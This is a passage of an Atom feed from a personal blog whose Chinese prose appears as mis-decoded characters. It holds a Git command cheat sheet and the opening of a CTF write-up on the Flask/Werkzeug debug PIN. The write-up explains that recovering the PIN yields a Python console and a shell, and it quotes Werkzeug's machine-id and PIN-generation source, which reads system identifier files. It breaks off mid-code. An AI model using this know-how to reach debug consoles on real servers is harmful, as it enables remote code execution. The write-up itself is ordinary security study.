    <content type="html"><![CDATA[<h2 id="ã€‡ã€è·å–æœ¬åœ°ä»“åº“"><a href="#ã€‡ã€è·å–æœ¬åœ°ä»“åº“" class="headerlink" title="ã€‡ã€è·å–æœ¬åœ°ä»“åº“"></a>ã€‡ã€è·å–æœ¬åœ°ä»“åº“</h2><ol><li><code>git init</code> åˆå§‹åŒ–ä»“åº“</li><li><code>git clone &lt;url&gt;</code> ä»è¿œç¨‹ä»“åº“å…‹éš†ï¼ˆurl å¯é‡‡ç”¨ gitã€httpã€https å’Œ ssh ç­‰åè®®ï¼‰</li></ol><h2 id="ä¸€ã€æœ¬åœ°æ–‡ä»¶ä¿®æ”¹ã€æäº¤åŠæŸ¥çœ‹ç­‰"><a href="#ä¸€ã€æœ¬åœ°æ–‡ä»¶ä¿®æ”¹ã€æäº¤åŠæŸ¥çœ‹ç­‰" class="headerlink" title="ä¸€ã€æœ¬åœ°æ–‡ä»¶ä¿®æ”¹ã€æäº¤åŠæŸ¥çœ‹ç­‰"></a>ä¸€ã€æœ¬åœ°æ–‡ä»¶ä¿®æ”¹ã€æäº¤åŠæŸ¥çœ‹ç­‰</h2><ol><li><p><code>git status</code> æŸ¥çœ‹å·²è·Ÿè¸ªæ–‡ä»¶çŠ¶æ€ï¼ˆä¿®æ”¹ã€æ–°åŠ ã€æ”¹åã€åˆ é™¤ç­‰ï¼‰</p></li><li><p><code>git add &lt;file&gt;</code> è¿½è¸ªæ–°æ–‡ä»¶</p></li><li><p><code>.gitignore</code> æ–‡ä»¶ä¸­æ·»åŠ è¢«å¿½ç•¥çš„æ–‡ä»¶</p><ul><li>ä»¥ <code>#</code> å¼€å¤´çš„å†…å®¹ä¸ºæ³¨é‡Šï¼Œè¢« Git è‡ªåŠ¨å¿½ç•¥</li><li>å¯ä½¿ç”¨ Glob è¡¨è¾¾å¼è¿›è¡Œæ¨¡å¼åŒ¹é…</li><li>æ¨¡å¼æœ€åè·Ÿæ–œæ ï¼ˆ <code>/</code> ï¼‰è¡¨ç¤ºç›®å½•</li><li>æ¨¡å¼å‰åŠ å¹å·ï¼ˆ <code>!</code> ï¼‰ è¡¨ç¤ºå–å</li></ul></li><li><p><code>git diff</code> å½“å‰æ–‡ä»¶ä¸æš‚å­˜åŒºä¹‹é—´çš„å·®å¼‚</p><ul><li><code>--cached</code> / <code>--staged</code> æš‚å­˜åŒºä¸ä¸Šæ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚</li></ul></li><li><p><code>git commit</code> æäº¤æ›´æ”¹</p><ul><li><code>-m</code> æ·»åŠ æœ¬æ¬¡æäº¤çš„è¯´æ˜ï¼ˆè‹¥æ— è¯¥å‚æ•°å°†æ‰“å¼€æ–‡æœ¬ç¼–è¾‘å™¨è¿›è¡Œæ·»åŠ ï¼‰</li><li><code>-a</code> æäº¤æ‰€æœ‰å·²æš‚å­˜çš„æ–‡ä»¶ï¼ˆè·³è¿‡ <code>git add</code> è¿‡ç¨‹ï¼‰</li><li><code>--amend</code> æ’¤é”€æœ€åçš„æäº¤å¹¶é‡æ–°æäº¤</li></ul></li><li><p><code>git rm</code> ä» ä»“åº“ï¼ˆæš‚å­˜åŒºï¼‰å’Œ å·¥ä½œç›®å½• ä¸­åˆ é™¤</p><ul><li><code>-f</code> å¼ºåˆ¶åˆ é™¤ï¼ˆå·²ä¿®æ”¹å¹¶æ”¾å…¥æš‚å­˜åŒºçš„æ–‡ä»¶ï¼‰</li><li><code>--cached</code> åªä»ä»“åº“ï¼ˆæš‚å­˜åŒºï¼‰ä¸­åˆ é™¤ï¼Œä¿ç•™åœ¨å·¥ä½œç›®å½•ä¸­</li></ul></li><li><p><code>git mv</code> ç§»åŠ¨æ–‡ä»¶ï¼ˆ<code>git mv oldfile newfile</code> ç›¸å½“äºè¿è¡Œä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv oldfile newfile</span><br><span class="line">git rm oldfile</span><br><span class="line">gie add newfile</span><br></pre></td></tr></table></figure></li><li><p><code>git log</code> æŸ¥çœ‹æäº¤å†å²</p><ul><li><p><code>-p</code> æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„å†…å®¹å·®å¼‚</p></li><li><p><code>-&lt;X&gt;</code> (X ä¸ºæ•°å­—) åªæ˜¾ç¤ºæœ€è¿‘ X æ¬¡æäº¤</p></li><li><p><code>--stat</code> ä»…æ˜¾ç¤ºç®€è¦çš„å¢æ”¹è¡Œæ•°ç»Ÿè®¡</p></li><li><p><code>--pretty=</code> æŒ‡å®šæ˜¾ç¤ºçš„æ ¼å¼</p><ul><li><p><code>oneline</code> <code>short</code> <code>full</code> <code>fuller</code> è°ƒæ•´å±•ç¤ºä¿¡æ¯çš„å¤šå°‘</p></li><li><p><code>format:&quot;&quot;</code> è‡ªå®šä¹‰è¦æ˜¾ç¤ºçš„æ ¼å¼ï¼ˆå¯ä½¿ç”¨å¦‚ä¸‹å ä½ç¬¦ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%H æäº¤å¯¹è±¡ï¼ˆcommitï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸²</span><br><span class="line">%h æäº¤å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸²</span><br><span class="line">%T æ ‘å¯¹è±¡ï¼ˆtreeï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸²</span><br><span class="line">%t æ ‘å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸²</span><br><span class="line">%P çˆ¶å¯¹è±¡ï¼ˆparentï¼‰çš„å®Œæ•´å“ˆå¸Œå­—ä¸²</span><br><span class="line">%p çˆ¶å¯¹è±¡çš„ç®€çŸ­å“ˆå¸Œå­—ä¸²</span><br><span class="line">%an ä½œè€…ï¼ˆauthorï¼‰çš„åå­—</span><br><span class="line">%ae ä½œè€…çš„ç”µå­é‚®ä»¶åœ°å€</span><br><span class="line">%ad ä½œè€…ä¿®è®¢æ—¥æœŸï¼ˆå¯ä»¥ç”¨ -date&#x3D; é€‰é¡¹å®šåˆ¶æ ¼å¼ï¼‰</span><br><span class="line">%ar ä½œè€…ä¿®è®¢æ—¥æœŸï¼ŒæŒ‰å¤šä¹…ä»¥å‰çš„æ–¹å¼æ˜¾ç¤º</span><br><span class="line">%cn æäº¤è€…(committer)çš„åå­—</span><br><span class="line">%ce æäº¤è€…çš„ç”µå­é‚®ä»¶åœ°å€</span><br><span class="line">%cd æäº¤æ—¥æœŸ</span><br><span class="line">%cr æäº¤æ—¥æœŸï¼ŒæŒ‰å¤šä¹…ä»¥å‰çš„æ–¹å¼æ˜¾ç¤º</span><br><span class="line">%s æäº¤è¯´æ˜</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>--graph</code> ç”¨å›¾å½¢è¡¨ç¤ºæ‰€åœ¨åˆ†æ”¯åŠåˆå¹¶å†å²</p></li><li><p><code>--relative-date</code> ä½¿ç”¨ç›¸å¯¹æ—¶é—´è¡¨ç¤º</p></li><li><p><code>--name-only</code> ä»…æ˜¾ç¤ºæ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤çš„æ–‡ä»¶çš„æ–‡ä»¶å</p></li><li><p><code>--name-status</code> æ˜¾ç¤ºæ–°å¢ã€ä¿®æ”¹ã€åˆ é™¤çš„æ–‡ä»¶çš„æ–‡ä»¶åå’Œæ‰§è¡Œçš„æ“ä½œï¼ˆA D Mï¼‰</p></li><li><p><code>--abbrev-commit</code> ä»…æ˜¾ç¤º SHA-1 çš„å‰å‡ ä¸ªå­—ç¬¦</p></li><li><p><code>--shortstat</code> ä»…æ˜¾ç¤ºæ€»çš„è¡Œæ•°ä¿®æ”¹ç»Ÿè®¡ï¼ˆä¸æ˜¾ç¤ºå•æ–‡ä»¶çš„å˜åŒ–ï¼‰</p></li><li><p><code>--since=</code> <code>--after=</code> ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´åçš„æäº¤</p></li><li><p><code>--until=</code> <code>--before=</code> ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´ä¹‹å‰çš„æäº¤</p></li><li><p><code>--author=</code> ä»…æ˜¾ç¤ºæŒ‡å®šä½œè€…çš„æäº¤</p></li><li><p><code>--committer=</code> ä»…æ˜¾ç¤ºæŒ‡å®šæäº¤è€…çš„æäº¤</p></li><li><p><code>--no-merges</code> æ’é™¤æ¥è‡ªåˆå¹¶çš„æäº¤</p></li><li><p><code>--merges</code> åªæ˜¾ç¤ºæ¥è‡ªåˆå¹¶çš„æäº¤</p></li><li><p><code>--grep=</code> åŒ¹é…æäº¤ä¿¡æ¯ä¸­çš„å…³é”®å­—</p></li><li><p>æœ€åå•ç‹¬çš„ <code>--</code> åçš„æ‰€æœ‰å†…å®¹ä¸ºé™å®šçš„è·¯å¾„æˆ–æ–‡ä»¶å</p></li></ul></li><li><p><code>git reset HEAD &lt;file&gt;</code> å–æ¶ˆå¯¹æ–‡ä»¶çš„æš‚å­˜</p></li><li><p><code>git checkout -- &lt;file&gt;</code> å–æ¶ˆå¯¹æ–‡ä»¶çš„ä¿®æ”¹ï¼ˆä»…é™äºä¿®æ”¹åæœªæš‚å­˜çš„æ–‡ä»¶ï¼‰</p></li></ol><h2 id="äºŒã€æœ¬åœ°ä¸è¿œç¨‹ä»“åº“ä¹‹é—´çš„æ“ä½œ"><a href="#äºŒã€æœ¬åœ°ä¸è¿œç¨‹ä»“åº“ä¹‹é—´çš„æ“ä½œ" class="headerlink" title="äºŒã€æœ¬åœ°ä¸è¿œç¨‹ä»“åº“ä¹‹é—´çš„æ“ä½œ"></a>äºŒã€æœ¬åœ°ä¸è¿œç¨‹ä»“åº“ä¹‹é—´çš„æ“ä½œ</h2><ol><li><code>git remote</code> åˆ—å‡ºæ‰€æœ‰è¿œç¨‹åº“çš„åå­—<ul><li><code>-v</code> <code>--verbose</code> æ˜¾ç¤ºå¯¹åº”çš„åœ°å€</li><li><code>add &lt;shortname&gt; &lt;url&gt;</code> æ·»åŠ æ–°çš„è¿œç¨‹ä»“åº“</li><li><code>show &lt;remote-name&gt;</code> æŸ¥çœ‹æŸä¸ªè¿œç¨‹ä»“åº“çš„è¯¦ç»†ä¿¡æ¯</li><li><code>rename &lt;old-name&gt; &lt;new-name&gt;</code> ä¿®æ”¹è¿œç¨‹ä»“åº“åœ¨æœ¬åœ°çš„ç®€ç§°</li><li><code>rm &lt;remote-name&gt;</code> ç§»é™¤æŸä¸ªè¿œç¨‹ä»“åº“</li></ul></li><li><code>git fetch &lt;remote-name&gt;</code> æ‹‰å–è¿œç¨‹ä»“åº“æœ‰ä½†æœ¬åœ°æ²¡æœ‰çš„æ•°æ®ï¼ˆä¸åˆå¹¶ï¼‰</li><li><code>git pull</code> æ‹‰å–è·Ÿè¸ªçš„è¿œç¨‹ä»“åº“å¯¹åº”åˆ†æ”¯çš„æ•°æ®å¹¶åˆå¹¶</li><li><code>git push &lt;remote-name&gt; &lt;branch-name&gt;</code> å°†æœ¬åœ°çš„æŸåˆ†æ”¯æ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼ˆé»˜è®¤ä¸º origin masterï¼‰</li></ol><h2 id="ä¸‰ã€æ ‡ç­¾æœ‰å…³æ“ä½œ"><a href="#ä¸‰ã€æ ‡ç­¾æœ‰å…³æ“ä½œ" class="headerlink" title="ä¸‰ã€æ ‡ç­¾æœ‰å…³æ“ä½œ"></a>ä¸‰ã€æ ‡ç­¾æœ‰å…³æ“ä½œ</h2><ol><li><code>git tag</code> åˆ—å‡ºç°æœ‰æ ‡ç­¾<ul><li><code>-l &#39;&#39;</code> æ¨¡å¼æœç´¢ç¬¦åˆæ¡ä»¶çš„æ ‡ç­¾</li><li><code>-a &lt;tag-name&gt; [SHA-1]</code> æ·»åŠ ï¼ˆè¡¥åŠ ï¼‰å«é™„æ³¨çš„æ ‡ç­¾</li><li><code>-s &lt;tag-name&gt;</code> åŒä¸Šæ·»åŠ æ ‡ç­¾å¹¶ç”¨ GPG ç­¾ç½²æ ‡ç­¾</li><li><code>-m</code> æ ‡ç­¾çš„é™„æ³¨è¯´æ˜</li><li><code>&lt;tag-name&gt;</code> æ·»åŠ è½»é‡çº§æ ‡ç­¾ï¼ˆæ— éœ€é™„æ³¨ï¼‰</li><li><code>-v &lt;tag-name&gt;</code> éªŒè¯å·²ç­¾ç½²çš„æ ‡ç­¾</li></ul></li><li><code>git show &lt;tag-name&gt;</code> æŸ¥çœ‹ç›¸åº”æ ‡ç­¾çš„ç‰ˆæœ¬ä¿¡æ¯</li><li><code>git push &lt;remote-name&gt; &lt;tag-name&gt;</code> å°†æœ¬åœ°çš„æŸæ ‡ç­¾æ¨é€åˆ°è¿œç¨‹ä»“åº“<ul><li><code>--tags</code> æ¨é€æ‰€æœ‰æœ¬åœ°æ–°å¢çš„æ ‡ç­¾</li></ul></li></ol><h2 id="å››ã€åˆ†æ”¯æœ‰å…³æ“ä½œ"><a href="#å››ã€åˆ†æ”¯æœ‰å…³æ“ä½œ" class="headerlink" title="å››ã€åˆ†æ”¯æœ‰å…³æ“ä½œ"></a>å››ã€åˆ†æ”¯æœ‰å…³æ“ä½œ</h2><ol><li><p><code>git branch</code> åˆ—å‡ºæ‰€æœ‰åˆ†æ”¯å’Œå½“å‰æŒ‡å‘åˆ†æ”¯</p><ul><li><code>&lt;branch-name&gt;</code> åˆ›å»ºæ–°åˆ†æ”¯</li></ul></li><li><p><code>git checkout</code></p><ul><li><p><code>&lt;branch-name&gt;</code> åˆ‡æ¢åˆ°æŸåˆ†æ”¯</p></li><li><p><code>-b &lt;branch-name&gt;</code> åˆ›å»ºå¹¶åˆ‡æ¢åˆ°åˆ†æ”¯ï¼ˆç›¸å½“äºä¸€ä¸‹ä¸¤æ¡å‘½ä»¤ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch &lt;branch-name&gt;</span><br><span class="line">git checkout &lt;branch-name&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>-b &lt;branch-name&gt; &lt;remote-name&gt;/&lt;remote-branch&gt;</code> ä»è¿œç¨‹åˆ†æ”¯åˆ›å»ºåˆ†æ”¯å¹¶è·Ÿè¸ª</p></li><li><p><code>--track &lt;remote-name&gt;/&lt;remote-branch&gt;</code> ä»è¿œç¨‹åˆ†æ”¯åˆ›å»º<strong>åŒå</strong>åˆ†æ”¯å¹¶è·Ÿè¸ª</p></li><li><p><code>-d &lt;branch-name&gt;</code> åˆ é™¤æŸåˆ†æ”¯</p></li><li><p><code>-v</code> æ˜¾ç¤ºæ¯ä¸ªåˆ†æ”¯æœ€åä¸€æ¬¡æäº¤çš„ä¿¡æ¯</p></li></ul></li><li><p><code>git merge &lt;branch-name&gt;</code> å°†æŸåˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ï¼ˆå¯èƒ½å‡ºç°å†²çªéœ€è¦<strong>æ‰‹åŠ¨å¤„ç†</strong>ï¼‰</p></li><li><p><code>git push &lt;remote-name&gt; &lt;branch-name&gt;:&lt;remote-branch&gt;</code> å°†æœ¬åœ°åˆ†æ”¯æ¨é€åˆ°å‘½åä¸åŒçš„è¿œç¨‹åˆ†æ”¯ï¼ˆæœ¬åœ°åˆ†æ”¯ç•™ç©ºæ¨é€ç©ºåˆ†æ”¯ï¼Œå³ä¸ºåˆ é™¤è¿œç¨‹åˆ†æ”¯ï¼‰</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ã€‡ã€è·å–æœ¬åœ°ä»“åº“&quot;&gt;&lt;a href=&quot;#ã€‡ã€è·å–æœ¬åœ°ä»“åº“&quot; class=&quot;headerlink&quot; title=&quot;ã€‡ã€è·å–æœ¬åœ°ä»“åº“&quot;&gt;&lt;/a&gt;ã€‡ã€è·å–æœ¬åœ°ä»“åº“&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;git init&lt;/code&gt; åˆå§‹åŒ–ä»“åº“&lt;/li&gt;&lt;li&gt;&lt;code
      
    
    </summary>
    
    
      <category term="å¿ƒè·¯å†ç¨‹" scheme="https://x5tar.com/categories/%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/"/>
    
    
      <category term="å­¦ä¹ " scheme="https://x5tar.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Git" scheme="https://x5tar.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>å…³äº Flask Debug PIN çš„å®‰å…¨æ€§é—®é¢˜</title>
    <link href="https://x5tar.com/2019/11/26/flask-debug-pin/"/>
    <id>https://x5tar.com/2019/11/26/flask-debug-pin/</id>
    <published>2019-11-26T11:03:51.000Z</published>
    <updated>2020-05-03T09:24:39.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸Šå‘¨æ‰“å—é‚®çš„ NCTF æ—¶ç¢°åˆ°äº†ä¸€é“åä¸º flask_website çš„é¢˜ï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œä½†å‘ç°æ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œåæ¥ç‚¹åˆ°é¡µé¢æœ€ä¸‹è¾¹çš„ä¸€ä¸ªé“¾æ¥ï¼Œè·³è½¬åˆ°äº† Debug æ¨¡å¼çš„æŠ¥é”™ç•Œé¢ï¼Œä»æ­¤å¤„äº†è§£åˆ° Flask Debug PIN çš„å­˜åœ¨ï¼Œè¿™ä¸ªåˆ©ç”¨å¯èƒ½æ¯”è¾ƒé¸¡è‚‹ï¼Œä½†å€’æ˜¯æŒºæœ‰è¶£çš„</p><h2 id="0x01-Flask-Debug-æ¨¡å¼"><a href="#0x01-Flask-Debug-æ¨¡å¼" class="headerlink" title="0x01 Flask Debug æ¨¡å¼"></a>0x01 Flask Debug æ¨¡å¼</h2><p>åªéœ€è¦åœ¨ <code>app.run()</code> çš„å‚æ•°ä¸­æ·»åŠ  <code>debug=True</code> å³å¯å¼€å¯ Debug æ¨¡å¼ï¼Œæ­¤æ—¶å‡ºç°é”™è¯¯å°†å‘ˆç°é”™è¯¯ä¿¡æ¯ï¼Œåœ¨æŠ¥é”™ç•Œé¢å¯ä½¿ç”¨ <code>Flask Debug PIN</code> ç›´æ¥è°ƒç”¨ Python console ï¼Œè¿™é‡Œåªéœ€è·å– PIN å³å¯ getshell</p><h2 id="0x02-æºç åˆ†æ"><a href="#0x02-æºç åˆ†æ" class="headerlink" title="0x02 æºç åˆ†æ"></a>0x02 æºç åˆ†æ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pythonæ‰€åœ¨ç›®å½•/Lib/site-packages/werkzeug/debug/__init__.py</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_machine_id</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line">    rv = _machine_id</span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># docker containers share the same machine id, get the</span></span><br><span class="line">        <span class="comment"># container id instead</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/proc/self/cgroup"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                value = f.readline()</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = value.strip().partition(<span class="string">"/docker/"</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Potential sources of secret information on linux.  The machine-id</span></span><br><span class="line">        <span class="comment"># is stable across boots, the boot id is not</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">"/etc/machine-id"</span>, <span class="string">"/proc/sys/kernel/random/boot_id"</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X we can use the computer's serial number assuming that</span></span><br><span class="line">        <span class="comment"># ioreg exists and can spit out that information.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Also catch import errors: subprocess may not be available, e.g.</span></span><br><span class="line">            <span class="comment"># Google App Engine</span></span><br><span class="line">            <span class="comment"># See https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">"ioreg"</span>, <span class="string">"-c"</span>, <span class="string">"IOPlatformExpertDevice"</span>, <span class="string">"-d"</span>, <span class="string">"2"</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            match = re.search(<span class="string">b'"serial-number" = &lt;([^&gt;]+)'</span>, dump)</span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows we can use winreg to get the machine guid</span></span><br><span class="line">        wr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg <span class="keyword">as</span> wr</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">import</span> _winreg <span class="keyword">as</span> wr</span><br><span class="line">            <span class="keyword">except</span> ImportError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> wr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> wr.OpenKey(</span><br><span class="line">                    wr.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">"SOFTWARE\\Microsoft\\Cryptography"</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    wr.KEY_READ | wr.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    machineGuid, wrType = wr.QueryValueEx(rk, <span class="string">"MachineGuid"</span>)</span><br><span class="line">                    <span class="keyword">if</span> wrType == wr.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    _machine_id = rv = _generate()</span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin_and_cookie_name</span><span class="params">(app)</span>:</span></span><br><span class="line">    <span class="string">"""Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    pin = os.environ.get(<span class="string">"WERKZEUG_DEBUG_PIN"</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">"off"</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">"-"</span>, <span class="string">""</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"-"</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = getattr(app, <span class="string">"__module__"</span>, app.__class__.__module__)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports 